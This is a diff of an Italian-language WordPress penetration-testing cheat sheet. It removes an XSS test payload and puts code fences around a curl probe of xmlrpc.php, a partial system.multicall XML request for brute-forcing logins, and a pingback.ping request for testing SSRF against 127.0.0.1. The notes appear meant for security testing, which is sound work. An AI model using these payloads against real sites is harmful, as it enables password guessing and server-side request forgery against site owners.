@@ -63,9 +63,6 @@ Campi search
 
 Shortcode non sanitizzati
 
-Payload veloce:
-"><img src=x onerror=alert(1)>
-
 SQL Injection
 
 WordPress core è in genere sicuro → test sui plugin:
@@ -131,7 +128,9 @@ HTTP calls interne (curl).
 
 ## XMLRPC.PHP
 
+```
 curl -X POST https://target/xmlrpc.php -d '<methodCall><methodName>demo.sayHello</methodName></methodCall>'
+```
 
 **Brute Force via system.multicall (Attacco potente)**
 
@@ -141,6 +140,7 @@ system.multicall permette di inviare decine/centinaia di tentativi di login in u
 
 Esempio PoC:
 
+```
 <?xml version="1.0"?>
 <methodCall>
   <methodName>system.multicall</methodName>
@@ -174,7 +174,6 @@ Esempio PoC:
                 </member>
               </struct>
             </value>
-
             <!-- aggiungi altre password qui -->
           </data>
         </array>
@@ -182,6 +181,7 @@ Esempio PoC:
     </param>
   </params>
 </methodCall>
+```
 
 
 Se un tentativo ha successo, WordPress ritorna le info del blog.
@@ -196,12 +196,13 @@ Permette di far fare al server richieste verso URL interni.
 
 Test:
 
+```
 curl -X POST https://target/xmlrpc.php \
 -d '<methodCall><methodName>pingback.ping</methodName>
 <params>
   <param><value>http://google.com</value></param>
   <param><value>http://127.0.0.1:80/</value></param>
 </params></methodCall>'
-
+```
 
 Se il server risponde con errori specifici → SSRF fattibile.
